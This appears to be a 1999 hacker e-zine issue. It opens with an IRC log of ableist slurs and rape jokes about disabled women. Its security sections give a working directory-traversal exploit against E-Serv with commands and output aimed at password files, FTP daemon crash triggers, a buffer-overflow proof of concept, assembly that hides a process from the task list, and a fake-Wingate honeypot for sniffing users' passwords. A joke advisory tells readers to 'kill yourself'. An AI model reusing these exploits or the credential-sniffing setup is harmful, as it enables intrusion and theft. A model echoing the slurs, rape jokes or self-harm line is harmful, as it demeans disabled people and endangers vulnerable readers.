+*** Quits: esteban (Quit: Uggghhh - Its the mommy monster - hhheeeellllppp)
+<Vortexia> oh god read his quit message
+<jus> omg this guy is funny
+<Vortexia> HAHAHAHAHAHAH
+<Vortexia> the mommy monster
+<Vortexia> ROTFL
+<acid> omigod
+<acid> this guy is fucking clueless
+<jus> u telling me
+<jus> he is the one that told me that win2k was hte best os in the whole world
+
+---// Pheered log showing why we don't Pheer "normal" chiqz
+
+щнщ ch1ckie [none@204.83.200.200] has joined #ch4x 
+<wyze1> yeh
+<wyze1> or pix of us raping people from the spastic children's association of
+singapore
+р Pneuma just realised most spazes be butt ugly!
+<wyze1> Pneuma: wtf?!! j00 crazy?!!!
+<edgecrush> spastics are seczy!!
+<wyze1> da way dey m0ve around j0r wang - ooooh jeah!
+<Pneuma> man, i just want sum nice chiq fwom cherynobyl, dey at least be
+normal, got 4 full legs and 3 heads, not like dem spaz freaks!!!
+<edgecrush> http://www.portalofevil.com/fatchicksinpartyhats/fathat37.jpg
+<edgecrush> ^-- secz g0dess
+<Pneuma> man, dat shit be da dopest!
+<edgecrush> http://www.portalofevil.com/fatchicksinpartyhats/fathat27.jpg
+<edgecrush> ^-- fuqin sexy ebony bi4tch r3t4rd
+<odci> hah
+<odci> http://www.portalofevil.com/fatchicksinpartyhats/superfatty.mpg
+<edgecrush> that is me trying to catch her for some rape action
+<Pneuma> man, i told j00 i dunno wanna none of dem freak ugly 2 legged 1
+headed sluts, gimme normal bitches from Cherynobyl ways y0!!!
+<cua0> ok thats just retarded
+<ch1ckie> er..
+<wyze1> oh man, know what i love...
+<wyze1> chiqz with gulf war syndrome!@#$
+<wyze1> no arms and shit, man, aawwww yeh!
+<edgecrush> that is the secziest shit
+<Pneuma> yeah, i knows what you'all saying man, dem sluts be dope!
+<ch1ckie> that is retarded
+<wyze1> ch1ckie: u think this is weird ya shoulda been here earlier :P
+<ch1ckie> you know what i like? guys with class, guys with maturity
+<edgecrush> genital warts and shit
+<ch1ckie> ferget THAT haha
+<wyze1> ch1ckie: shutup you damn 2-armed, 2-legged tramp!
+<ch1ckie> wyze: say that a little louder bitch
+<wyze1> awww
+<wyze1> i love it when the big genital warts pop as they orgasm
+<edgecrush> yeah
+<wyze1> and the puss sprays all over you
+<wyze1> fuq jeah
+<edgecrush> and that squelching noise it makes as you uNF them
+<ch1ckie> guess i was right; no class present in HERE tonite
+<ch1ckie> if you'll excuse me..
+щнщ ch1ckie [none@204.83.200.200] has left #ch4x
+<wyze1> LOL!
+<wyze1> jeah!
+<wyze1> get outta here!
+<edgecrush> m0uahahahahaha
+<wyze1> damn slut still has all her limbs and no genital warts - who would
+want her?!
+<edgecrush> fucking normal chicks
+<edgecrush> who needs em
+<wyze1> she isn't even spastic
+
+---// End of Pheer
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+            "Bugs that I am embarassed to admit I found" by Wyzewun
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+Yeap, found some dumb stuff that no-one in their right mind would care about,
+that I would be embarassed putting on BugTraq, and that I seriously just don't
+*want* for myself, so I figured I'd just chuck them here for lack of anywhere
+better to put them. :)
+
+----[ Table of Contents
+
+[-*-] Proxy Plus
+[-*-] NiteServer
+[-*-] ISpy Webcam
+[-*-] XiRCON
+[-*-] E-Serv
+[-*-] Generic Windoze Vulnerability
+
+----[ Proxy Plus
+
+The Proxy+ 2.30 proxy server available from www.proxyplus.cz appears to have
+some insecure default settings.
+
+As per default, remote administration of the proxy server is possible to
+anyone who cares to point their browser to http://hostname:4400/admin
+
+We must also consider that 99% of the people who are smart enough to know how
+to setup an access list for Proxy+ will also be dumb enough to set it up for
+localhost only security - forgetting the open web proxy on port 4480 - meaning
+that anybody can *still* access the Administrator menu if they have a brain.
+This is a concept originally explored in rfp's article in Phrack 54. Werd to
+him. :)
+
+Also, do not forget the Telnet gateway which is also open by default, which is
+an alternative to a Wingate for purposes of anonymous bouncing. (Although,
+unlike Wingate, Proxy+ *does* log by default and is thus not so incredibly
+anonymous. :P And then again, people can remotely turn logging OFF by default,
+so wtf) Regardless, the welcome banner looks like this, should you wish to
+scan for it - You've probably seen one before...
+
+<blank line>
+TelNet Gateway Ready
+Enter destination (host_name:port):
+
+Overall, hacking yourself a Proxy Plus proxy is much better than a Wingate
+because you can keep it all to yourself, administer it remotely etc. etc. -
+it's just damn nice in general. :)
+
+Oh, and Proxy+ Servers are most common in Czechoslovakia (.cz) if you wanna
+try and scan for them.
+
+----[ NiteServer FTPd
+
+This server is coded in VB and so, as you can imagine, is vulnerable to
+thousands of DoS attacks. The first occurs when the daemon is fed over 40 or
+so "USER whatever" strings. The FTPd runs out of memory and commits suicide.
+
+The second occurs when a password (PASS) is not terminated, and the daemon
+just keeps on getting fed more and more characters, and allocating memory for
+all of them. While the daemon is being attacked, it will not respond to any
+users who are connecting to it, and the actual program will refuse to
+communicate with anyone physcially at the host. Windows will become more slow
+and unusable then it already is and the system may or may not fall over     
+completely eventually. 
+
+The third: login, then type "PORT fuck,me,but,is,this,ftpd,lame,or,what" and
+then disconnect immediately. The FTP daemon will stop accepting connections.
+
+The fourth: give a long argument to RNTO. Once again, it decides to stop
+accepting connections. Is this daemon a fucking pussy or what? I could go on
+to list more, but it would just be cruel. Shjeesh, what's even sadder is that
+the author is trying to sell the source code to this thing: as if some-one
+would actually want it - HEH!@#$%
+
+----[ ISpy Webcam
+
+The very popular ISpy Webcam by Creative stores the password for the FTP site
+it uploads to in the registry under \\HKEY_CURRENT_USER\Software\ISpy\ISPY\FTP
+in the "Password" value with a very laughable "encryption" scheme. Just a
+substitution cipher. I would include the key, but really, it's not worth the
+space. Just keep this in mind and figure the rest out yerself. :)
+
+----[ XiRCON
+
+The XiRCON IRC client disconnects from the IRC server it's connected to when
+recieving overly long CTCP messages. What an elite client.
+
+----[ E-Serv
+
+E-Serv (available from www.eserv.ru) is a SMTP, POP3, NNTP, FTP, HTTP, Proxy,
+and Finger server. When testing out The HTTP server on my box, which is
+accesible by default on Port 3128 and will most probably be moved to 80 on
+servers where it's being used as a webserver (It is also the Proxy's remote
+administration thingy), I found it to have a serious security flaw. All
+versions prior to 2.8 are vulnerable. We downloaded the "latest" version from
+Tucows (2.5) and assumed the bug had not been fixed, but when we mailed the
+authors of the software, turned out they had found the bug themselves and
+fixed it in 2.8! Guess Tucows aren't into updating their archive, eh?
+Regardless, old versions are still common and I don't think the vulnerability
+has been covered publically, so let's get to the sploit...
+
+[drew@kung-fusion]$ telnet ghay.windoze.box 3128
+Trying 192.168.66.7...
+Connected to ghay.windoze.box.
+Escape character is '^]'.
+GET /../../../../../../../../../../../../../../autoexec.bat HTTP/1.1
+
+HTTP/1.1 200 OK
+Content-Length: 297
+
+@echo off
+SET BLASTER=A220 I5 D1 T4
+PATH=C:\WINDOWS;C:\WINDOWS\COMMAND;C:\JDK\BIN
+
+CHOICE /C:YN /T:N,05 "Load SoftICE Debugger?"
+If Errorlevel=2 Goto End
+If Errorlevel=1 goto Softice
+
+:SoftIce
+echo Softice Loading
+C:\wyze1\exec\SOFTICE\WINICE.EXE
+goto end
+:End
+echo Starting Windows
+
+Simple directory climbing Ala-Ali-Baba. :)
+
+It then occured to me - "Hey, these people probably use the same routine for
+*all* file access". Over to the doze box...
+
+C:\wyze1>ftp localhost
+Connected to wizdumb.
+220 Eserv/2.5  FTP ready
+User (wizdumb:(none)): anonymous
+331 Password required
+Password:
+230 Login OK
+ftp> ls /../../../../../../../../../../../
+200 PORT command successful.
+150 Opening data connection
+226 Transfer complete
+ftp> ls ../../../../../../../../../../../
+200 PORT command successful.
+150 Opening data connection
+226 Transfer complete
+ftp> ls 
+200 PORT command successful.
+150 Opening data connection
+226 Transfer complete
+ftp> get ../../../../../../../../../autoexec.bat
+200 PORT command successful.
+150 Opening data connection
+226 Transfer complete
+ftp: 421 bytes received in 0.05Seconds 8.42Kbytes/sec.
+ftp> quit
+221 Goodbye.
+
+Hmm, well I was right to an extent. You can't list files, but you *can*
+retrieve any file you want provided you know the name which is good enough if
+we just go and retrieve the password files. :) And after all, I *might* be
+able to list files, if the damn directory listing *worked*. *Sigh* :P Anyway,
+we should get sam._ on NT boxes, but on 9x boxes you'll probably have to grab
+the E-Serv password file which can be found in /../../../conf/EServ.ini and
+uses fairly trivial encryption. Also note that the FTP server will be on port
+3121 by default, and may be moved to port 21 on some boxes.
+
+Now for a few interesting things that will probably apply to current versions
+as well: in E-Serv is that the anonymous FTP account applies for POP3 as well,
+so an E-Serv server can be a nice anonymous mail pickup for anyone who cares
+to connect to the POP3 daemon and login anonymously. The daemon also does
+stuff like making the modem dial/hangup CGI feature (http://host:3128/dial)
+accessible to anyone with a user-level login, including anonymous, although it
+can be configured to be Admin only, it is like this by default. Ditto for the
+webmail interface accepting anonymous logins. And finally - a hint: looking
+for folks that run E-Serv? Scan Good ol' Mother Russia, heh.
+
+----[ Generic Windoze vulnerability
+
+So many Windoze FTP/HTTP daemons allow you to play with files with device
+special filenames like COM1. This can result in allowing you to disconnect 
+their modems, or in a worst-case scenario, taking full control of their 
+modems and/or printers. 
+
+----[ Thats it for now
+
+My dog ate this frog, and it lay down in our lounge for a week before it died.
+You shouldn't let your dog eat frogs, man.
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+             PHEAR Advisory Re: Divine forces (PH-99:01) by Pneuma
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                                    
+An Official
+
+ЬЫЫЫЫЫЫЫЫЬ      ЬЫЫ   ЫЫЬ       ЬЫЫЫЫЫЫЫЫЫЬ       ЬЫЫЫЫЫЫЫЬ       ЬЫЫЫЫЫЫЫЫЬ
+ЫЫЫЯ   ЯЫЫЫ    ЫЫЫЫ   ЫЫЫЫ      ЫЫЫЫ    ЯЯЯ      ЫЫЫЫЯЯЯЫЫЫЫ      ЫЫЫЯ   ЯЫЫЫ
+ЫЫЫЬ   ЬЫЫЫ    ЫЫЫЫЫЫЫЫЫЫЫ      ЫЫЫЫЬЬЬЬЬ        ЫЫЫЫЬЬЬЫЫЫЫ      ЫЫЫЬ   ЬЫЫЫ
+ЫЫЫЫЫЫЫЫЫЯ     ЫЫЫЫЯЯЯЫЫЫЫ      ЫЫЫЫЯЯЯЯЯ        ЫЫЫЫЫЫЫЫЫЫЫ      ЫЫЫЫЫЫЫЫЫЯ
+ЫЫЫЫ      ЬЫЫЬ ЫЫЫЫ   ЫЫЫЫ ЬЫЫЬ ЫЫЫЫ    ЬЬЬ ЬЫЫЬ ЫЫЫЫ   ЫЫЫЫ ЬЫЫЬ ЫЫЫЫ ЯЫЫЫЫЬ
+ЯЫЫЯ      ЯЫЫЯ  ЯЫЫ   ЫЫЯ  ЯЫЫЯ ЯЫЫЫЫЫЫЫЫЫЯ ЯЫЫЯ ЯЫЫЯ   ЯЫЫЯ ЯЫЫЯ ЯЫЫЯ   ЯЫЫЯ
+
+                  (Post-Human Electronic Anarchy Research)
+                                   Advisory
+
+=============================================================================
+PH-99:01                        PHEAR Advisory
+                               December 04, 1999
+                       Alledged "Deity" hacker gang attacks. 
+-----------------------------------------------------------------------------
+
+After a good coupla hours worth in a Mass Debate (Geddit? Massdebate!@#$ huh
+huh.. huh... yeh) *ahem* err... the Post-Human Electronic Anarchy Research
+centre has finally decided upon the implications of the following hack attack
+perpetrated almost entirely by the member of the "Deities" commonly refered to
+as "God".
+
+The attacks are untraceble and so the entire blame often lies entirely on him,
+and we cannot determine if some or all of the attacks originate from other 
+members of the "Deities".
+-----------------------------------------------------------------------------
+The bug affects the following Systems and\or OS's:
+        
+          -Every single Platform and Hardware configuration
+          -OS Independant (ie. all of them)
+
+Laptops are generally not affected as long as the "power-in" cable is not
+plugged in at that moment or the "carrier" is not the highest object at the
+time.
+
+As we receive additional information relating to this advisory, we will
+place it in
+
+        http://127.0.0.1/all/for/myself/mwuahahahaha
+
+We encourage you to check our README files regularly for updates on advisories
+that relate to your server.
+
+-----------------------------------------------------------------------------
+
+I.   Description
+
+The attacks originated from the "Deity" groups first conception, sometime in
+what era is reffered to colloquially as "Negative Infinity". The bug appears
+often and in extreme cases not only affects computers, but other household
+appliances including persons, tree's and electricity pylons.
+
+The attack is generally a Denial of Service, but it has devastating effects
+on most objects targeted, causing a flux in high voltage electricity resulting
+in extreme hardware failure, often "frying" motherboards, cpu's and other
+internal organs.
+
+The attack is purported to be called "Lightning" and is implimented by
+lightning.c which is rumoured to be available to certain deities and magicians
+and runs under the Microsoft UNIX Operating System. The attack is more likely
+to affect systems and appliances that are either on a high elevation in
+relation to other objects in the genral area and on so called "magnetic
+plains" which are generally properties in which the sub-terra contains an
+unusual amount of iron bearing loadstone, but be warned, the attack has
+capabilities to propogate itself through power lines and telephone lines when
+the "worm" mode is enabled.
+
+II.  Impact
+
+This "God" character appears to be able to target any object anywhere and at
+anytime. Some cases of his handy work include a Roy C. Sullivan, former
+Yellowstone Park Ranger, whose physical person was attacked 7 times but
+luckily suffered no actual hardware damage due to his implementation of a
+security device that is commonly refered to as "Tough Inbred Hick Genes".
+Another case that occured earlier this year was the two incidents when a
+member of the "Deities" attacked African soccer teams, once damaging the
+entire teams hardware and internal organs, and the other only half of the
+team had to be replaced. Also they often victimise common home users PC's
+using the worm method to go through the power line and knocking out as much
+as 200 personal computers in a row.
+
+III. Solution
+
+The Post-Human Electronic Anarchy Research Board investigated a number of
+potential methodologies for protecting one's system and one's self from 
+this extremely potent Denial of Service attack, but all proposed solutions
+only lessened chances of being attacked, and not completely protected one 
+against the threat of being attacked.
+
+However, thanks to some brilliant suggestions from Wyzewun, we managed to
+design a system to protect one completely from these instances of "Divine
+Intervention." Just follow these five simple steps...
+
+1. Unplug your computer
+2. Throw it into the ocean
+3. Devour your next of kin
+4. Sell your house
+5. Kill yourself
+
+We suggest you follow these steps as soon as possible, as CERT are having a
+great deal of trouble catching "God" and the other members of his hacker gang,
+and by not acting immediately there is a higher chance that you will be
+affected by this and other security flaws in Earth's architecture.
+
+---------------------------------------------------------------------------
+Find other PHEAR advisories in Forbidden Knowledge E-Zine periodically, or
+on our site.
+
+Copyright 1999 Post-Human
+This material may be reproduced and distributed without permission provided it
+is used for noncommercial purposes, that the copyright statement is included
+and that the Sys Admin of the box it is distributed on masturbates at least
+twice a day, if not more.
+
+PHEAR is a trademark of Post-Human.
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                Principles of Buffer Overflow explained by Jus
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+This article is an attempt to quickly and simply explain everyone's favourite
+manner of exploiting daemons - The Buffer Overflow.
+
+- Huh? -
+
+The remote buffer overflow is a very commonly found and exploited bug in badly
+coded daemons - by overflowing the stack one can cause the software to execute
+a shell equal to its current UID - thus if the daemon is run as root, like
+many are, a root shell will be spawned, giving full remote access.
+
+A buffer is a block of computer memory that holds many instances of the same
+data type - an array. Arrays can be static and dynamic, static being allocated
+at load time and dynamic being allocated dynamically at run time. We will be
+looking at dynamic buffers, or stack-based buffers, and overflowing, filling
+up over the top, or breaking their boundaries.
+
+A stack has the property of a queue of objects being placed one on top of the
+other, and the last object placed on the stack will be the first one to be
+removed. This is called LIFO - or last in first out. An element can be added 
+to the stack (PUSH) and removed (POP). A stack is made up of stack frames, 
+which are pushed when calling a function in code and popped when returning it.
+
+The stack pointer (SP) always points to the top of the stack, the bottom of it
+is static. PUSH and POP operations manipulate the size of the stack
+dynamically at run time, and its growth will either be down the memory
+addresses, or up them.  This means that one could address variables in the
+stack by giving their offsets from SP, but as POP's and PUSH's occur these
+offsets change around. Another type of pointer points to a fixed location
+within a frame (FP). This can be used for referencing variables because their
+distances from the FP will not change.
+
+- The Overflow -
+
+A buffer overflow is what happens when more data is forced into the stack than
+it can handle. We use this to change the flow of execution of a program -
+hopefully by executing code of our choice, normally just to spawn a shell.
+
+We can change the return address of a function by overwriting the entire
+contents of the buffer, by overfilling it and pushing data out - this then
+means that we can change the flow of the program. By filling the buffer up
+with shellcode, designed to spawn a shell on the remote machine, and
+overwriting the return address so that it points back into the buffer, we can
+make the program run the shellcode.
+
+This is just a simplified version of what actually happens during a buffer
+overflow - there is more to it, but the basics are essential to understand if
+you want to win an argument one day.
+
+-jus (jus@security.za.net)
+
+[ Epilogue by Wyzewun:
+
+Time for a practical example. I did this some time ago on my Dad's Windoze box
+to explain it to myself: I had downloaded a file on Win32 buffer overflows but
+I really didn't feel like reading, so I figured it out myself instead. It took
+me +-20 mins to do the whole thing, but at least I was keeping a log of me
+trying to get it right so I can just paste it more or less unchanged here -
+save, of course, for the explanations. Next time I'll get human and actually
+READ UP on whatever I'm trying to do before I try DO it so I don't waste so
+much damn time. :/ Anyway, here's the notes...
+
+#include <iostream.h>
+#include <string.h>
+
+int main() {
+
+  char buffer[40];
+  char buffer2[20]; // This doesn't need to be smaller though
+
+  cout << "Gimmee a variable\n";
+  cin >> buffer;
+  strcpy(buffer2, buffer);
+  return 666; }
+
+Because strcpy() has no bounds checking, there is an obvious buffer overflow
+vulnerability here...
+
+c:\>overflow
+Gimmee a variable
+12345678901234567890
+
+It executed fine. Now lets try...
+
+c:\>overflow
+Gimmee a variable
+123456789012345678901
+
+At this point Windoze cuts in with the following...
+
+OVERFLOW caused an invalid page fault in module OVERFLOW.EXE at 015f:00402127.
+
+Registers:
+EAX=0000029a CS=015f EIP=00402127 EFLGS=00000206
+EBX=00530000 SS=0167 ESP=0063fe0c EBP=00630031
+ECX=0063fdd4 DS=0167 ESI=81596754 FS=1157
+EDX=00400031 ES=0167 EDI=00000000 GS=0000
+
+Bytes at CS:EIP:
+89 45 e4 50 e8 12 15 00 00 8b 45 ec 8b 08 8b 09 
+
+Stack dump:
+00000000 81596754 00530000 c0000005 0063ff68 0063fe0c 0063fc3c 0063ff68
+00403d18 00407190 00000000 0063ff78 bff8b537 00000000 81596754 00530000 
+
+Is this a buffer overflow bug or is this something else we are mistaking for
+one? Well, let's check, we feed it a good 30 "a" characters and we look at the
+values of the registers when it dies....
+
+Registers:
+EAX=0000029a CS=015f EIP=61616161 EFLGS=00000202
+EBX=00530000 SS=0167 ESP=0063fe00 EBP=61616161
+ECX=0063fddc DS=0167 ESI=81596628 FS=117f
+EDX=00006161 ES=0167 EDI=00000000 GS=0000
+
+Aaah, see that? EIP is 61616161 - 61 being the hex value of the "a" character,
+so it's overflowing allright. Now let's exploit it. :) First off, we add the
+following line into the example C++ proggy above...
+
+cout << &buffer2 << "\n";
+
+And when executing the program, the output we get is as follows...
+
+0x0063FDE4
+Gimmee a variable
+
+Right, so buffer2's address is 0x0063FDE4 - and just in case that's a bit off
+for some reason - we'll pad it a bit.
+
+Padding? Right. Executing the NOP function (0x90) which most CPU's have - just
+something to do nothing. That way, hopefully, when we overwrite the return
+address we can land somewhere in the middle of the NOPs, and then just execute
+along until we get to our shellcode. Errr, I'm not being clear, what I mean is
+the buffer will look like: [NOPNOPNOPNOP] [SHELLCODE] [NOPNOPNOPNOP] [RET]
+
+Shellcode? Right. We can execute pretty much anything we want, and as much as
+I would like to have interesting shellcode, I don't have the tools to make
+some on this PC, and I *really* don't feel like going online to rip somebody
+else's. And so, my choice in shellcode - int 20h - program termination. :)
+
+Right!!! So our shellcode is 2 characters, and we can feed the program 24
+characters before we start overwriting the return address, so lets have 11 NOP
+characters on either side of our shellcode just to make it pretty and even
+looking. Let's try this out...
+
+c:\>overflow
+Gimmee a variable
+ђђђђђђђђђђђН ђђђђђђђђђђђcэд
+
+c:\>
+
+Heeey, I gave it too many characters and it didn't crash. It worked. :) That
+string in hex would be 9090909090909090909090CD20909090909090909090909063FDE4,
+the CD20 in the middle being interrupt 20h, and the 63FDE4 being the address
+of the buffer we're overflowing, which we are setting as the return address,
+namely 0x0063FDE4. Hopefully you're beginning to see the idea here. If you
+would like to play around with my example file some more, I included the
+binary in the general-junk directory of this issue. Have fun! ]
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                  Introduction to Assembly Programming by Moe1
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+This will cover how to write your first program in assembly using DEBUG.COM as
+shipped with Windows 9x and MS-DOS...
+
+C:\party2k>debug
+- a100
+
+0C1B:0100 jmp 125
+(Jumps to direction 125H)
+
+0C1B:0102 [Enter]
+
+- e 102  'Happy Birthday FK!!!' 0d 0a '$'
+  [ In function 09 of Int 21, as with most functions of int 21, the string is
+    terminated with a "$" character. - Ed]
+
+- a125
+
+0C1B:0125 MOV DX,0102
+(Copies string to DX register) [Actually the Segment:Offset address of where
+in memory the string is stored to DX:DS. Remember each register has a high
+and low order byte? - Ed]
+
+0C1B:0128 MOV CX,000F
+(Amount of times the string will be displayed)
+
+0C1B:012B MOV AH,09
+(Copies 09 value to AH register) [09 is the function for MS-DOS to call - Ed]
+
+0C1B:012D INT 21
+(Displays string) [int 21h is the MS-DOS function call interrupt - Ed]
+
+0C1B:012F DEC CX
+(Reduces in 1 CX)
+
+0C1B:0130 JCXZ 0134
+(If CX is equal to 0 jumps to 0134)
+
+0C1B:0132 JMP 012D
+(Jumps to direction 012D)
+
+0C1B:0134 INT 20
+(Ends the program)
+
+0C74:0136 [ENTER]
+
+(Now we start compiling our lil codey, awww how kewt;)
+- h 0136 0100
+
+- n fkrulez.com
+
+- rcx
+CX 0000
+: 0036
+
+- w
+Writing 00036 bytes
+
+- q
+c:\party2k>fkrulez
+
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+Happy Birthday FK!!!
+
+So now as another practical example, let's look at how we would hide a program
+from Windoze using masm32. To do this we simply pass the program's process ID
+to the RegisterService() function thus registering the program as a service,
+which wont show up in the windows task list.
+
+.data               ; first we define in our data section
+
+    szKernel32      db   "Kernel32.dll",0
+    szRSP           db   "RegisterServiceProcess",0
+
+.code               ; now we start the code
+start:
+
+    push   offset szKernel32
+    call   GetModuleHandle       ; get Kernel32.dll handle
+    push   offset szRSP
+    push   eax
+    call   GetProcAddress        ; get function address
+    mov    ebx, eax              ; save our pointer into ebx
+
+    call   GetCurrentProcessId   ; get current process id
+
+    push   1                     ; 1 = Register Service, 0 = Unregister Serv.
+    push   eax                   ; process id
+    call   ebx                   ; call RegisterServiceProcess
+
+end start
+
+We could do this in any language which we can access the Win32 API from
+really, I just used assembly as an example because it's what we're playing
+with here. :)
+
+[ Some more additions from Wyzewun: And there you have it. If you're
+  interested in getting involved with Assembly Programming, look around at the
+  stuff available in the programming tutorials section of Packetstorm Security
+  and particularly the tutorial available there made by the University of
+  Guadalajara (don't ask me where that is) which is quite detailed. As you get
+  better you will find other resources for ASM coding all over the place, so
+  look around and you shouldn't have much trouble finding what you want. :)
+
+  PacketStorm also has some great resources for other programming languages
+  like C/C++, Pascal, JavaScript, Perl, Python - you name it. :) Mm, no TCL/TK
+  yet, but I s'pose you can pick that up at other places.
+
+  Also, try and see if you can get hold of the SAMS MS-DOS Bible - it's what
+  I learnt what I know about assembly from and it's a great reference for
+  DOS/Windoze ASM. Mmm, I'm still using the Second Edition (Covers MS-DOS 3.3)
+  but I'm sure there are newer versions lying around. Well, I hope. Otherwise
+  it won't be much use, now will it? :) ]
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                     Fun with "Trojan" Wingates by Wyzewun
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+Allright, here's a lame little idea for the purpose of abusing hacker kiddies.
+Scenario: It's a Sunday afternoon. There is nothing to do. The sun is cooking
+your brain and you've hardly the energy to move, let-alone actually do
+something that requires an IQ above that of an oyster. What do you do?
+
+Step One
++-====-+
+Install a Sniffer on your box. There is a nice collection of sniffers at
+ftp.technotronic.com/unix/network-sniffers or alternatively, if you have
+friends like Vortexia who are lamer warez kiddies that can leech stuff for
+you, have a NT/98 box as your gateway and install Sniffer Pro by Network
+Associates on it. It's a seriously kickass proggy - Even though NAI suck. :P
+
+Step Two
++-====-+
+Anyway, so for lack of anything better to do, lets go to www.cyberarmy.com and
+look at the list of Wingates. Hmmm... Bullshit, Bullshit, Bullshit - Aaah,
+here's one that works - lets say - dns.gincorp.co.jp - Right, so now we have
+a Wingate. Errr... So What?
+
+Step Three
++-======-+
+[drew@kung-fusion]$ cat > phjeeer << seckz
+#!/bin/bash
+nc dns.gincorp.co.jp 23
+echo shj3esh j0or a fuqn tw1t
+seckz
+[drew@kung-fusion]$ chmod 755 phjeeer
+
+Step Four
++-=====-+
+Hmmm. I'm still bored. I know! I think I'll su and edit some random junk into
+my /etc/inetd.conf or something...
+
+Before Eliteness...
+#telnet stream tcp nowait root /usr/local/libexec/tcpd /usr/libexec/telnetd
+
+After Eliteness...
+telnet stream tcp nowait drew /usr/local/libexec/tcpd /home/drew/phjeeer
+
+Now we 'killall -9 -HUP inetd' - loose our connection to that lame IRC
+session which wasn't even vaguely interesting anyway, and we are now left just
+as bored as before.
+
+Step Five
++-=====-+
+I'm bored. I think I'll telnet into myself...
+
+[drew@kung-fusion]$ telnet leet.bsd.box
+Trying 192.168.33.3...
+Connected to leet.bsd.box.
+Escape character is '^]'.
+Wingate>
+
+A Wingate! Fuqn shit du0d! I'm gonna go back to www.cyberarmy.com and add
+myself to the Wingate list so peeble can abj00ze me too!@#$%
+
+And then...
++--==--==-+
+Within a few hours, our sniffer logs begin to pick up all sorts of interesting
+things like usernames and passwords for things people shouldn't be accessing,
+lamers making fools of themselves on IRC and all sorts of funny stuff. Aaah,
+at last. Entertainment at the expense of the hacker community. Who says we
+aren't united, man? I *Love* these guys...
+
+But Remember...
++--==--==--==-+
+This can be dangerous and if you don't select the Wingate to abuse carefully
+you may end up getting yourself in more trouble than you bargained for. Don't
+be stupid. :)
+
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+                  Farewells, Goodbyes, Bitches and Gripes etc
+.-= {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-} {-=+=-}=-.
+
+                                        :::
+                             ,gQQ/   \Pj» i      ::::
+                            i$$P      ;$$I;      ;$$$
+                           ;$$I        $$$.      I$$I
+                           I$$;        I$$:     ;$$P
+                           $$$         ;$$I  ,j$$?'
+                     ZQQWW $$$ WWQQZ        $$$Qb,
+                          .$$$         .$$$  ''$$$\
+                          :$$$         ;$$$     ?$$;
+                          :$$$         :$$$     :$$$
+                          ::::         ::::     ::::
+
+                      gNO wYZE1, dONT pROBEZOR mE
+                         .....aGAIN!!@!          @
+                                              >--|--<
+                                   <@~           |
+                 WYZE1's dOG  -->    OOOO<  <---8|    <-- wYZE1
+                                    /\  /\      /'\
+
+             <fk> we're too cheap to afford a decent ascii artist
+
+Please support the official Forbidden Knowledge distribution sites...
+
++--===--===--===--===--===--===--===--===--===--===--===--===--===--===--===-+
+|     Attrition                            www.attrition.org                 |
+|     Packetstorm Security                 packetstorm.securify.com          |
+|     The E-Text Archives                  ftp.etext.org                     |
++--===--===--===--===--===--===--===--===--===--===--===--===--===--===--===-+
+
+Yeh, we gave up on keeping Post-Human up, coz Vortexia is useless and we
+really don't feel like finding another host. We might see something when
+Pneuma and I *finally* get our damn FreeBSD box online, but until then, we
+have regularly updated mirrors, so it doesn't really matter. :/
+
+Now, for those of you who think the zine is pretty much finished now - I'm
+afraid you're wrong. The zine isn't finished yet. Why? Because I still have a
+bone to pick with a certain institution: an institution void of any form of
+common sense, an institution which you probably refer to as "the scene."
+
+Yes, the "hacking scene" - probably the biggest force stunting the growth of
+hacking itself. For a group of people who *dare* to call themselves
+anarchists, I have never seen such a blatantly ordered institution. There is
+a strictly set-out protocol to the scene, what is cool, what is not, how to
+look elite etc. etc. Although classed according to opinion somewhat, it 
+always comes down to the same things...
+
+And those "same things" I refer to, have absolutely FUCK ALL to do with
+hacking. Trading n34t0 3L1t0 0-d4y sPL0itZ with complete twits on IRC, who
+probably haven't the first idea about how the thing actually works. Defacing
+webpages pointlessly just so other people in "the scene" can see your handle,
+or sometimes trying to pin an ill-fitting political motivation to your
+defacement as an after-thought (which is worse). Gathering in IRC channels 
+where nothing technical is ever actually discussed, and life is all about 
+showing everyone how leet we are, how many boxes we own and how dumb everyone
+else is. And even when there *is* technical conversation, the motivation 
+behind it is all fucked up - it's not for the sake of learning from eachother
+- its all about making eachother look stupid, or making one's self look smart.
+
+Anyone who can honestly say that the hacking scene promotes hacking is either
+a liar, or a complete outright idiot. Look at the people that become well
+known in the hacking scene - lets pick gov-boi from hack.co.za as an example.
+Why did he become well known? Because he can hack? Hell no! It wasn't 4 months
+ago that man was writing "No Distro" mIRC war scripts (I can publish them if 
+you don't believe me), his C code makes even novice coders laugh and he's 
